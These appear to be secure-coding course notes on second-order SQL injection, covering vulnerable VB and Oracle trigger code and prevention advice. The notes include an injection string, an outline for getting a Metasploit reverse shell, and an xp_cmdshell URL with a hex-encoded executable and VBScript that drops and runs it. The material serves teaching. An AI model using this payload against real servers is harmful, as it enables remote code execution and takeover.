### Second Order SQL Injection

#### Code Example
```vb
Set rec = conn.Execute(query1)
If (rec.EOF) Then
    Response.Write "Invalid Password"
Else
    query2 = "UPDATE tbl_user SET password='" & new_pass & "' WHERE login_id='" & rec("login_id") & "'"
    conn.Execute(query2)
End If
```

#### Vulnerability Explanation
- **Issue**: The code above is vulnerable to second-order SQL injection. This occurs when user input is not properly sanitized and is used in a subsequent database query.
- **Example Attack Vector**: If `login_id` is set to `foo' OR '1'='1`, the SQL query will be manipulated, potentially allowing unauthorized access or data manipulation.

#### Secure Coding Practices
- **Sanitize Input**: Always sanitize and validate user inputs before using them in SQL queries.
- **Use Prepared Statements**: Use parameterized queries or prepared statements to prevent SQL injection.

### Non-Interactive Second Order SQL Injection

#### Scenario
- **Step 1**: An attacker places an order via an e-commerce application.
- **Step 2**: The administrator logs in and approves the order.
- **Step 3**: The attacker's input gets passed to a vulnerable SQL call, leading to SQL injection.

#### Example Exploit
```sql
CREATE OR REPLACE TRIGGER "SYSTEM"."MYTRIGGER" BEFORE INSERT ON SCOTT.ORDER_TABLE
REFERENCING NEW AS NEWROW
FOR EACH ROW
DECLARE
    L NUMBER;
    S VARCHAR2(5000);
BEGIN
    L := LENGTH(:NEWROW.V);
    IF L > 15 THEN
        DBMS_OUTPUT.PUT_LINE('INSERTING INTO MYTABLE_LONG AS WELL');
        S := 'INSERT INTO MYTABLE_LONG (V) VALUES (''' || :NEWROW.V || ''')';
        EXECUTE IMMEDIATE S;
    END IF;
END MYTRIGGER;
ALTER TRIGGER "SYSTEM"."MYTRIGGER" ENABLE
```

#### Exploitation
- **Exploit Concept by Ferruh Mavituna**:
  - Generate a hex representation of a malicious payload (e.g., `shell.exe`).
  - Write a VBScript that can process this hex string and generate a valid binary file.
  - Combine this into a single line and carry out the SQL injection.
  - Enjoy the reverse shell connection to the attacker’s machine.

#### One-Click Ownage
- **Metasploit Payload**:
  - A payload is generated by Metasploit, which, when executed on the target server, initiates a reverse shell connection to the attacker's machine.
  - The payload is compressed and hex-encoded, then converted into a one-line VB script.
  - The SQL injection is exploited to deploy and execute the VB script on the target server, recreating and running the `shell.exe` file.

#### Example SQL Injection Exploit
```sql
http://example.com?sqlinjection.aso?id=1;exec master..xp_cmdshell 'echo d="4D5A900003x0304x03FFFFx02B8x0740x2380x030E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24x075045x024C0103006716F0D6x08E0000F030B0102380010x0310x0350x024062x0360x0370x0440x0210x0302x0204x0301x0304x0880x0310x0602x0520x0210x0410x0210x0610x0C70x02ACx7355505830x0550x0310x0702x0E80x02E055505831x0510x0360x0304x0302x0E40x02E055505832x0510x0370x0302x0306x0E40x02C0332E303500555058210D09020993B63B0E5CE0BCADA641x021D02x0326x0226x02C3B7FFDBFF31C0B9002040006830100464FF30648920506A406812x02DA2FE4F65151E9x023C90FF253C402916B205DB07x020F40882A4BE6000700FFFFEE01FCE8560...C70588D8E2D98DBE0040x028B0709C0743C8B5F048D84300060x0201F35083C708FF962860x02958A074708C074DC89F95748F2AE55FF962C60x0209C07407890383C304EBE1FF963C60x028BAE3060x028DBE00F0FFFFBB0010x0250546A045357FFD58D879F':W CreateObject^("Scripting.FileSystemObject"^).GetSpecialFolder^(2^) ^& "\wr.exe", R^(d^):Function R^(t^):Dim Arr^(^):For i=0 To Len^(t^)-1 Step 2:Redim Preserve Ar^(S^):FB=Mid^(t,i+1,1^):SB=Mid^(t,i+2,1^):HX=FB ^& SB:If FB="x" Then:NB=Mid^(t,i+3,1^):L=H^(SB ^& NB^):For j=0 To L:Redim Preserve Ar^(S+^(j*2^)+1^):Ar^(S+j^)=0:Ar^(S+j+1^)=0:Next:i=i+1:S=S+L:Else:If Len^(HX^)^>0 Then:Ar^(S^)=H^(HX^):End If:S=S+1:End If:Next:Redim Preserve Ar^(S-2^):R=Ar:End Function:Function H^(HX^):H=CLng^("&H" ^& HX^):End Function:Sub W^(FN, Buf^):Dim aBuf:Size = UBound^(Buf^):ReDim aBuf^(Size\2^):For I = 0 To Size - 1 Step 2:aBuf^(I\2^)=ChrW^(Buf^(I+1^)*256+Buf^(I^)^):Next:If I=Size Then:aBuf^(I\2^)=ChrW^(Buf^(I^)^):End If:aBuf=Join^(aBuf,""^):Set bS=CreateObject^("ADODB.Stream"^):bS.Type=1:bS.Open:With CreateObject^("ADODB.Stream"^):.Type=2:.Open:.WriteText aBuf:.Position=2:.CopyTo bS:.Close:End With:bS.SaveToFile FN,2:bS.Close:Set bS=Nothing:End Sub>p.vbs && p.vbs && %TEMP%\wr.exe‘
```

### Conclusion
- **Second Order SQL Injection** is a serious security risk that can lead to data breaches and unauthorized access.
- **Prevention**: Use prepared statements, sanitize inputs, and follow secure coding practices to mitigate these risks.

**Source**: Dan Haagman, InfoSecurity 2009  
**Course**: 7Safe Company Overview 2009, Secure Coding Course, © 7Safe, 6/11/2010  
**Topic**: Hacking Oracle from Web Applications